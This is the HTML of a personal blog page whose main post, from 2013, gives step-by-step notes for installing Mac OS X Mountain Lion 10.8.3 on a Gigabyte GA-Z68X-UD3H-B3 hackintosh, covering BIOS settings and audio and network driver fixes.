      <a data-url="http://midnightcodr.github.io/2013/05/09/nagios-audio-alert-with-mac-os-x/" data-id="7c9samhedmru4pbr" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2013/05/09/nagios-audio-alert-with-mac-os-x/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/" class="article-date">
  <time datetime="2013-04-09T00:02:00.000Z" itemprop="datePublished">Apr 8 2013</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/howto/">howto</a>►<a class="article-category-link" href="/categories/howto/tip/">tip</a>►<a class="article-category-link" href="/categories/howto/tip/tony-macx86/">tony macx86</a>►<a class="article-category-link" href="/categories/howto/tip/tony-macx86/hackintosh/">hackintosh</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/">GA-Z68X-UD3H-B3 F12 Mountain Lion 10.8.3 Installation Notes</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Last Friday I had a hard time installing Moutain Lion 10.8.2 onto a GA-Z68X-UD3H-B3 (BIOS version F10), which was running fine with Lion (10.7.3), with either upgrade or clean install method. With some help from <a href="http://www.kakewalk.se/forums/discussion/4008/success-ga-z68x-ud3h-10-8-x-mountain-lion/p1" target="_blank" rel="external">http://www.kakewalk.se/forums/discussion/4008/success-ga-z68x-ud3h-10-8-x-mountain-lion/p1</a> and <a href="http://www.tonymacx86.com/" target="_blank" rel="external">http://www.tonymacx86.com/</a> I managed to install ML 10.8.3 onto the system. Here are the steps:</p>
<ol>
<li>Make a 10.8.3 Unibeast bootable usb drive (doesn’t need to check either options when making the drive with Unibeast) </li>
<li>Upgrade BIOS to F12 (tried UEFI version but got BIOS ID check error hence I settled with F12)</li>
<li>In BIOS setting, make sure HPET is set to 64bit. The system has an Agility 3 120GB SSD so the SATA3 port mode should be set to ACHI</li>
<li>After installation, boot from Unibeast drive again but choose the OS on the SSD</li>
<li>Download DDST (to the desktop), Multibeast from tonymacx86.com, choose the followings (More on the audio later)<img src="/images/z68x-ud3h-b3-f12-ML-10.8.3.png" class="center"></li>
<li>After Multibeast and Lnx2Mac’s Realtek driver installations, shutdown, remove Unibeast drive and boot from SSD, network should be working but audio is not working (can see the sound icon, can adjust volume but there’s just no sound coming out)</li>
<li>Download Audio_Network.zip from <a href="http://ge.tt/6nuMCAL/v/0?c" target="_blank" rel="external">http://ge.tt/6nuMCAL/v/0?c</a>, unzip but only place AppleHDA.kext onto the desktop</li>
<li>Download KextBeast from tonymacx86.com and run it, it should pick up the AppleHDA.kext on the desktop</li>
<li>Run Multibeast again, select nothing but Drivers &amp; Bootloaders-&gt;Drivers-&gt;Audio-&gt;Realtek ALC8xx-&gt;Without DSDT-&gt;ALC889 (basically the same option for audio in step 5)</li>
<li>Reboot, audio problem should now be fixed (try different line out port if is sound still missing).</li>
<li>(Optional) If you need to use iMessage, you need to install the newest Chimera (2.0.1 currently) from <a href="http://www.tonymacx86.com/downloads.php?do=file&amp;id=164" target="_blank" rel="external">http://www.tonymacx86.com/downloads.php?do=file&amp;id=164</a></li>
</ol>
<h2 id="other_notes">other notes</h2>
<p>Trim doesn’t seem to be turned on when I checked the system info, need to spend some time to look into that.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/" data-id="x0gonqvrseqvwgxg" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/">DIY</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/fun/">fun</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/fun/monitor-stand/">monitor stand</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/fun/monitor-stand/ikea/">ikea</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/fun/standing-desk/">standing desk</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DIY/fun/standing-desk/ikea/">ikea</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/SSL/">SSL</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SSL/openssl/">openssl</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/fun/">fun</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/fun/health/">health</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/fun/health/programming/">programming</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/gitlab/">gitlab</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/gitlab/raspberrypi/">raspberrypi</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/gitlab/raspberrypi/rpi/">rpi</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/howto/">howto</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/fun/">fun</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/fun/nagios/">nagios</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/fun/nagios/node-js/">node.js</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/howto/node-js/">node.js</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/node-js/centos/">centos</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/node-js/centos/bz2/">bz2</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/howto/tip/">tip</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/tip/tony-macx86/">tony macx86</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/howto/tip/tony-macx86/hackintosh/">hackintosh</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/">javascript</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/security/">security</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/security/injection-attack/">injection attack</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/programming/">programming</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/programming/javascript/">javascript</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/shell/">shell</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/shell/zsh/">zsh</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/shell/zsh/command-line/">command-line</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/">mongodb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/programming/">programming</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sed/">sed</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/mongodb/" style="font-size: NaNpx;">mongodb</a><a href="/tags/programming/" style="font-size: NaNpx;">programming</a><a href="/tags/sed/" style="font-size: NaNpx;">sed</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/02/">February 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">June 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">April 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a><span class="archive-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2015/02/07/OHLC-data-grouping-with-mongodb/">OHLC data grouping with mongodb</a>
          </li>
        
          <li>
            <a href="/2014/11/22/How-to-convert-20-million-datetime-strings-to-ISODate-in-less-than-30-minutes/">How to convert 20 million datetime strings to ISODate in less than 30 minutes</a>
          </li>
        
          <li>
            <a href="/2014/11/02/Tips-to-make-the-life-of-coding-a-whole-lot-easier/">Tips to make the life of coding a whole lot easier</a>
          </li>
        
          <li>
            <a href="/2014/03/23/i-just-built-my-first-standing-desk/">I just built my first standing desk</a>
          </li>
        
          <li>
            <a href="/2014/01/11/install-gitlab-6-dot-4-on-raspberry-pi/">Install Gitlab(6.4) on Raspberry PI</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2015 Rico Chen<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    
<script>
  var disqus_shortname = 'ricosnewblog';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">

  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>



<script src="/js/script.js" type="text/javascript"></script>


  </div>
</body>
</html>